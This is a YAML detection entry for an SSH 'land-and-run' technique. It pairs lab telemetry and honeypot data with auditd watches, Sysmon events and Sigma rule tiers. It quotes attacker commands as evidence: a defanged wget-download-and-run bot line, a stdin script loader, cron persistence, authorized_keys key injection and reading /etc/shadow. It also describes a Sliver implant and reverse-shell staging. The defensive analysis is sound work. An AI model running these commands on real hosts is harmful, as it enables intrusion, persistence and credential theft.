# Lab-validated chokepoint entry.
# Evidence: auditd + Sysmon for Linux telemetry from two throwaway Azure VMs
# (Debian 12, Rocky 9), authorized assumed-breach exercise 2026-09-28.
# Operator: SancLogic. Target operator: JFrank.
# Prior evidence: 153-day SSH honeypot (2026-04-27 to 2026-09-26 UTC),
# 4,893 sessions fitting this shape out of 69,979 with commands.
Name: SSH Land-and-Run
PageStandardVersion: 1
Id: 7b15353b-9119-40c3-a1d6-13f9b692eb2a
MitreIds:
  - T1059.004    # Command and Scripting Interpreter: Unix Shell
  - T1105        # Ingress Tool Transfer
  - T1053.003    # Scheduled Task/Job: Cron
Tactics:
  - Execution
  - Persistence
Techniques:
  - "Command and Scripting Interpreter: Unix Shell"
  - "Ingress Tool Transfer"
  - "Scheduled Task/Job: Cron"
DetectionPriority: HIGH
ThreatPrevalence: HIGH
DetectionDifficulty: LOW
Description: >
  Every payload delivered over SSH must land on the host (file write) and
  something must execute it (execve). The transfer method changes, the
  launcher changes, but the file-write and process-execution events do not.
  These two surfaces catch every variant regardless of delivery channel —
  SSH native, C2 upload, or lateral movement. Lab-validated across 8
  delivery/execution variants, a Sliver C2 implant, and an internal lateral
  movement hop on two Linux distributions (Debian 12, Rocky 9) with auditd
  and Sysmon for Linux. Of ~80k total log lines captured, ~780 were
  operator-attributable exec events. Prior honeypot evidence: 4,893 of
  69,979 sessions with commands (6.99%) staged and ran code over 153 days.
LastUpdated: "2026-09-28"
Author: Jenna Frank
CoConspirator: SancLogic

TheConstant: >
  New code delivered over SSH must exist either as a file or as an
  interpreter's input stream, and some process must execute it. That holds
  whatever transfer method (download, stdin, scp, C2 upload, lateral
  movement) or launcher (the session shell, cron, systemd, nohup) is used.

Prerequisites:
  - SSH access to the target host (valid credentials or key)
  - Ability to write files to a staging directory (/tmp, /dev/shm, /var/tmp)
  - A shell or interpreter to execute the payload

AttackerControls:
  - Transfer method (scp, heredoc, base64, curl, wget, C2 upload, echo pipe)
  - Payload format (bash, python, ELF binary, encoded)
  - Execution method (bash, chmod+exec, source, python3, cron, nohup)
  - Staging directory (/tmp, /dev/shm, /var/tmp, /var/spool/cron)
  - Filename and timestamp (can masquerade and timestomp)
  - C2 channel (can tunnel through SSH reverse forwards)

AttackerCannotControl:
  - The file must be written to disk or tmpfs (generates a file-write event)
  - The execve syscall must fire to run the payload (generates a process-creation event)
  - Cron persistence requires a write to the cron spool directory
  - These events are generated by the kernel, not userspace — the attacker cannot suppress them without root-level auditd tampering

Chokepoints:
  - Stage: Payload Landing (the "land")
    Input: Attacker has SSH access and a payload to deliver
    Invariant: A file must be written to a staging directory
    Observable: >
      auditd file-write event with key file_land on /tmp, /dev/shm, /var/tmp,
      /var/spool/cron; Sysmon for Linux EID 11 (FileCreate). Lab evidence:
      26 file_land events on deb12, 30 on rocky9 — every delivery method
      (scp, heredoc, base64, echo pipe, python write, C2 upload, lateral scp)
      generated at least one file_land event.
    WhyCantBypass: >
      The payload must exist on the filesystem (or tmpfs) before it can execute.
      Even memory-backed tmpfs (/dev/shm) generates file-write events because
      the kernel mediates the write. C2 uploads via Sliver still write to the
      target filesystem — lab evidence: Sliver upload to /dev/shm/.cache
      triggered file_land. Lateral movement SCP from rocky9 to deb12
      (/tmp/.svc) also triggered file_land on the second host.
    LogSources:
      - "auditd: syscall watch -w /tmp -p wa -k file_land (and /dev/shm, /var/tmp, /var/spool/cron)"
      - "Sysmon for Linux: Event ID 11 (FileCreate)"
    DetectionTier: Research
    SigmaRef: sigma-rules/ssh-land-and-run/research.yml
    BypassNotes:
      - Id: BN-01
        Title: SSH authorized_keys persistence not caught
        Description: >
          authorized_keys injection to ~/.ssh produced zero file_land events
          because the watch paths do not include home directories. Lab evidence:
          echo "ssh-rsa AAAAB3FakeKeyForLabAAAA attacker@c2" >> ~/.ssh/authorized_keys
          on rocky9 generated no file_land. Recommend adding
          -w /root/.ssh -p wa -k persist_keys and per-user ~/.ssh equivalents.
        MitreRef: T1098.004
      - Id: BN-02
        Title: Sensitive file reads invisible
        Description: >
          cat /etc/shadow generated only a generic cat execve with no target
          file visibility. file_land is write/attr only (-p wa) and does not
          watch /etc/shadow for reads. Lab evidence: credential harvesting on
          both hosts produced exec_log for cat but no file_land for the read
          target. Recommend a read watch (-w /etc/shadow -p r) or
          execve+argument correlation.
        MitreRef: T1003.008
      - Id: BN-03
        Title: High noise from system activity requires baseline tuning
        Description: >
          Raw exec volume was dominated by system activity. Of ~38k total exec
          events across both hosts, only ~780 were operator-attributable
          (auid=sanc). Major noise sources: dracut initramfs rebuild, iptables
          (6,813 events), pidof (1,701 events), systemd-private tmp churn.
          A noise baseline excluding systemd-private-* and dracut initramfs
          paths is needed before this is analyst-usable.

  - Stage: Payload Execution (the "run")
    Input: Payload exists on the host
    Invariant: The execve syscall fires
    Observable: >
      auditd execve event with key exec_log; Sysmon for Linux EID 1
      (ProcessCreate) with full command line. Lab evidence: every execution
      method tested — bash, chmod+exec, source, python3, cron, nohup —
      generated exec_log events. On deb12: 1 .update execution caught. On
      rocky9: 6 .update executions, plus .cache, .payload, and
      systemd-helper executions caught. Sysmon EID 1 captured full command
      lines including chmod +x /tmp/.update && /tmp/.update &,
      nohup /tmp/.update, python3 /tmp/t06.py, and
      bash -c chmod +x /tmp/.update && /tmp/.update &.
    WhyCantBypass: >
      Every process on Linux starts with execve (or execveat). There is no
      way to run code without this syscall. Bash, python3, chmod+exec, cron,
      nohup — all generate execve. The kernel logs it, not userspace. Lab
      evidence confirms this across both Debian and Rocky Linux kernels.
    LogSources:
      - "auditd: -a always,exit -F arch=b64 -S execve -F key=exec_log (and b32)"
      - "Sysmon for Linux: Event ID 1 (ProcessCreate)"
    DetectionTier: Hunt
    SigmaRef: sigma-rules/ssh-land-and-run/hunt.yml

  - Stage: Land Then Run on the Same Host (correlation)
    Input: A staged file and a later execution of the same path
    Invariant: The executed path must be the path that was written, on the same host
    Observable: >
      A file create under a staging directory followed by a process whose
      Image is that same path, on the same host. Lab evidence: every variant
      showed a file_land event for the path followed by an exec_log event for
      the same path on the same host. The Sliver implant /tmp/.update was
      written (file_land) then executed (exec_log) on both deb12 and rocky9.
      The lateral-movement SCP to /tmp/.svc on deb12 showed the same
      file_land-then-exec_log pair from an internal source.
    WhyCantBypass: >
      Joining on host and file path links a stage and a run even when they
      happen in different SSH connections or when cron starts the file after
      the session ends. The analyst rule correlates TargetFilename to Image;
      runs through an interpreter (sh /tmp/w.sh) need a backend query that
      finds the path inside CommandLine.
    LogSources:
      - "Sysmon for Linux: Event IDs 1 and 11"
      - "auditd: execve plus file watches"
    DetectionTier: Analyst
    SigmaRef: sigma-rules/ssh-land-and-run/analyst.yml
    BypassNotes:
      - Id: BN-04
        Title: Interpreter-mediated runs not caught by Image path join
        Description: >
          Runs through an interpreter (sh /tmp/w.sh, python3 /tmp/t06.py)
          have the interpreter as Image, not the staged path. The analyst
          rule's dot-prefix selection catches hidden files executed directly;
          interpreter runs need a backend query matching the path inside
          CommandLine.

Variations:
  - Name: SCP file transfer then bash execution
    VariantId: scp-bash
    FirstSeen: "2026-Q3"
    Status: Active
    ChokepointMapping: "scp file write to /tmp → bash execve"
    NotesShort: scp payload to /tmp, then ssh target 'bash /tmp/payload.sh'
    Notes: >
      Lab markers T01 and T02. T01: scp t01.sh to /tmp, bash execution.
      T02: scp t02.sh to /tmp, chmod +x then direct execution. Both
      generated file_land (sftp-server open) and exec_log events. Also
      used for Sliver implant delivery: scp MID_ORGAN to /tmp/.update (41MB
      ELF binary), chmod+exec. Confirmed on both deb12 and rocky9.
  - Name: Heredoc write then bash execution
    VariantId: heredoc-bash
    FirstSeen: "2026-Q3"
    Status: Active
    ChokepointMapping: "heredoc file write to /tmp → bash execve"
    NotesShort: ssh target 'cat << EOF > /tmp/t03.sh ... EOF && bash /tmp/t03.sh'
    Notes: >
      Lab marker T03. The heredoc is written by the session shell (bash),
      generating a file_land event with bash as the writing process. The
      same bash then executes it. Single SSH command, two chokepoint events.
  - Name: Base64 decode then execution
    VariantId: base64-decode-exec
    FirstSeen: "2026-Q3"
    Status: Active
    ChokepointMapping: "base64 decode write to /tmp → bash execve"
    NotesShort: echo [B64] | base64 -d > /tmp/t04.sh && bash /tmp/t04.sh
    Notes: >
      Lab marker T04. Payload encoded as base64, decoded and written to /tmp
      on the target. file_land fires on the write; exec_log fires on the
      bash execution. The encoding is an attacker control; the file write
      and execve are not.
  - Name: Echo pipe then source execution
    VariantId: echo-pipe-source
    FirstSeen: "2026-Q3"
    Status: Active
    ChokepointMapping: "echo write to /tmp → source (.) execve"
    NotesShort: echo "logger ..." > /tmp/t05.sh && source /tmp/t05.sh
    Notes: >
      Lab marker T05. The source builtin reads and executes commands from
      the file in the current shell context. file_land fires on the echo
      redirect; exec_log fires for any external commands the sourced script
      calls (logger in this case).
  - Name: Python write then python execution
    VariantId: python-write-exec
    FirstSeen: "2026-Q3"
    Status: Active
    ChokepointMapping: "scp python file to /tmp → python3 execve"
    NotesShort: scp t_py.py to /tmp/t06.py then python3 /tmp/t06.py
    Notes: >
      Lab marker T_PY. Python payload delivered via scp, executed with
      python3. file_land fires for the scp write; exec_log fires for
      python3. Sysmon EID 1 captured the full command line including the
      script path.
  - Name: C2 upload to tmpfs then implant execution
    VariantId: c2-upload-tmpfs
    FirstSeen: "2026-Q3"
    Status: Active
    ChokepointMapping: "Sliver C2 upload to /dev/shm → execute via implant"
    NotesShort: Sliver upload command writes to /dev/shm/.cache; executed via implant
    Notes: >
      Reverse shell payload uploaded through the Sliver C2 session to
      /dev/shm/.cache — a memory-backed tmpfs commonly used by attackers
      to avoid disk forensics. file_land caught the write regardless because
      auditd watches tmpfs the same as disk. The implant executed it via
      bash, generating exec_log. This variant proves the chokepoint catches
      C2-channel delivery, not just SSH-native delivery.
  - Name: Lateral movement SCP redeployment
    VariantId: lateral-scp-redeploy
    FirstSeen: "2026-Q3"
    Status: Active
    ChokepointMapping: "internal scp from rocky9 to deb12 /tmp/.svc → nohup execve"
    NotesShort: scp /tmp/.update sanc@10.50.0.4:/tmp/.svc then remote nohup execution
    Notes: >
      The attacker moved from rocky9 to deb12 on the internal subnet
      (10.50.0.0/26), deploying the Sliver implant via scp to /tmp/.svc and
      executing with nohup. file_land on deb12 caught the file landing;
      exec_log caught the execution. This proves the chokepoint is not
      limited to initial access — the same file-write + execve pattern fires
      on internal pivots (T1021.004 / T1570).
  - Name: Cron persistence via spool write
    VariantId: cron-spool-persist
    FirstSeen: "2026-Q3"
    Status: Active
    SourceURL: https://attack.mitre.org/techniques/T1053/003/
    ChokepointMapping: "crontab write or direct spool write → deferred crond execve"
    NotesShort: crontab - or echo | tee to /var/spool/cron/crontabs/
    Notes: >
      Two variants tested. Rocky9 (crontab installed): echo "* * * * *
      /tmp/.update" | crontab - generated file_land on /var/spool/cron via
      crontab's temp file rename. Debian (no crontab binary): direct write
      to /var/spool/cron/crontabs/sanc and /var/spool/cron/crontabs/root
      via tee. Both generated file_land events. The "run" is deferred — crond
      would execute /tmp/.update on the next minute boundary.
  - Name: Download to a file, run directly (honeypot)
    VariantId: wget-chmod-run
    FirstSeen: "2026-Q2"
    Status: Active
    SourceURL: https://attack.mitre.org/techniques/T1105/
    ChokepointMapping: "sshd shell → wget -O bot (land) → chmod 777 → ./bot (run)"
    NotesShort: wget -O bot; chmod 777 bot; ./bot
    Notes: >
      463 staged-then-executed sessions on the SSH honeypot (153 days, 69,979
      sessions) first staged with a download to a file. Most run the file in
      the same request. This is the most common non-stdin land method seen in
      the wild. The lab exercise confirmed the same pattern with SCP delivery.
    Command:
      Invocation: "wget hxxp://src-3856:8080/bot.amd64 -O bot; chmod 777 bot; ./bot telnet.amd64; rm -f bot"
      Artifacts:
        - "Honeypot transcript, session ae6fc296-6cd7-4590-a316-8721cf8a4e96"
  - Name: Payload over SSH stdin, run by cron (honeypot)
    VariantId: stdin-cron-deferred
    FirstSeen: "2026-Q2"
    Status: Active
    SourceURL: https://attack.mitre.org/techniques/T1053/003/
    ChokepointMapping: "sshd shell → cat > w.sh (land) → chmod +x → crontab @reboot / hourly → crond runs w.sh (run, deferred)"
    NotesShort: cat > w.sh from stdin, then a cron line; never run inside the session
    Notes: >
      4,055 sessions on the SSH honeypot. The loader writes w.sh from the SSH
      channel's stdin, marks it executable, schedules it @reboot and hourly
      with a cron line, and adds a systemd user unit. None of the sessions
      ran its file directly. On a real host the run starts under crond, outside
      the SSH session. The lab exercise validated the same cron persistence
      pattern via crontab and direct spool write.
    Command:
      Invocation: "cd \"/tmp\" && if [ ! -f \"w[.]sh\" ]; then cat > \"w[.]sh\" && chmod +x w[.]sh; fi"
      Artifacts:
        - "Honeypot transcript, session 8596ef87-77a4-4b79-afcb-ddc279fe4ace"

Detections:
  - Level: Research
    Description: >
      Files created in /tmp, /var/tmp or /dev/shm — baseline of what
      normally writes to staging directories.
    LogSources:
      - Sysmon for Linux Event ID 11
      - auditd file watches (-w /tmp -p wa -k file_land)
    Logic: "Any file created under /tmp/, /var/tmp/ or /dev/shm/."
    ExpectedFPRate: High
    UseCase: Learning normal staging-directory writes before tuning the hunt and analyst tiers
    SigmaRule: sigma-rules/ssh-land-and-run/research.yml
    Validation:
      RuleStatus: Experimental
      State: Lab-validated
      Backends:
        - "auditd (exec_log + file_land keys) on Debian 12 and Rocky 9"
        - "Sysmon for Linux 1.5.3 on Debian 12 and Rocky 9"
      Notes: >
        Validated 2026-09-28. All 8 delivery methods generated file_land
        events: 26 on deb12, 30 on rocky9. High noise from system activity
        confirmed — baseline tuning required.
  - Level: Hunt
    Description: >
      A process run from a staging directory, filtering known system paths.
    LogSources:
      - Sysmon for Linux Event ID 1
      - auditd execve
    Logic: >
      Image starts with /tmp/, /var/tmp/ or /dev/shm/, excluding
      systemd-private, dracut, and initramfs paths.
    ExpectedFPRate: Medium
    UseCase: Hunting for execution from staging directories on SSH-exposed hosts
    SigmaRule: sigma-rules/ssh-land-and-run/hunt.yml
    Validation:
      RuleStatus: Experimental
      State: Lab-validated
      Backends:
        - "auditd (exec_log) on Debian 12 and Rocky 9"
        - "Sysmon for Linux 1.5.3 on Debian 12 and Rocky 9"
      Notes: >
        Validated 2026-09-28. All execution methods (bash, chmod+exec,
        source, python3, cron, nohup) generated exec_log events. System
        noise filters reduce volume significantly.
  - Level: Analyst
    Description: >
      Hidden (dot-prefixed) or suspiciously named binary execution from
      staging directories, or cron-launched execution from staging paths.
    LogSources:
      - Sysmon for Linux Event ID 1
      - auditd execve
    Logic: >
      Image starts with /tmp/., /dev/shm/., or /var/tmp/. (dot-prefixed);
      or ParentImage ends with /cron and Image starts with a staging
      directory. Low false-positive: legitimate software rarely uses hidden
      files in /tmp.
    ExpectedFPRate: Low
    UseCase: SOC-deployable alerting on hidden-file execution from staging directories
    SigmaRule: sigma-rules/ssh-land-and-run/analyst.yml
    Validation:
      RuleStatus: Experimental
      State: Lab-validated
      Backends:
        - "auditd (exec_log) on Debian 12 and Rocky 9"
        - "Sysmon for Linux 1.5.3 on Debian 12 and Rocky 9"
      Notes: >
        Validated 2026-09-28. The Sliver implant at /tmp/.update, the
        reverse shell at /dev/shm/.cache, and the staging payload at
        /dev/shm/.payload all match the dot-prefix selection. The cron
        persistence writing /tmp/.update to a crontab matches the
        cron-from-staging selection.

